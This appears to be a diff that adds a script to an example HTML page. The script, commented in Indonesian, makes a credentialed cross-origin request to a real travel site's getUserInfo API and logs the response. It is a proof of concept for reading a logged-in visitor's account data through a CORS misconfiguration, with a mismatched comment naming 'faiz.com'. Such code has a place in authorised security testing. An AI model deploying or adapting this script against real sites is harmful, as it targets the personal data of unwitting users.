@@ -8,5 +8,34 @@
 <body>
     <h1>ini hanya contoh</h1>
     <h2>ini contoh 2</h2>
+    <script>
+        // 1. Inisialisasi objek XMLHttpRequest
+var xhr = new XMLHttpRequest();
+
+// 2. Tentukan metode HTTP dan URL target
+var targetUrl = "https://id.trip.com/restapi/soa2/27024/getUserInfo"; 
+xhr.open("GET", targetUrl, true);
+
+// 3. Mengaktifkan fitur kredensial 
+// Ini akan menyertakan cookies atau header otorisasi dalam permintaan lintas domain
+xhr.withCredentials = true;
+
+// 4. Fungsi penanganan ketika respon diterima
+xhr.onreadystatechange = function() {
+    if (xhr.readyState === XMLHttpRequest.DONE) {
+        if (xhr.status === 200) {
+            // Berhasil menerima respon dari server
+            console.log("Respon diterima dari faiz.com:");
+            console.log(xhr.responseText);
+        } else {
+            console.log("Permintaan gagal. Status:", xhr.status);
+        }
+    }
+};
+
+// 5. Kirim request
+xhr.send();
+
+    </script>
 </body>
 </html>
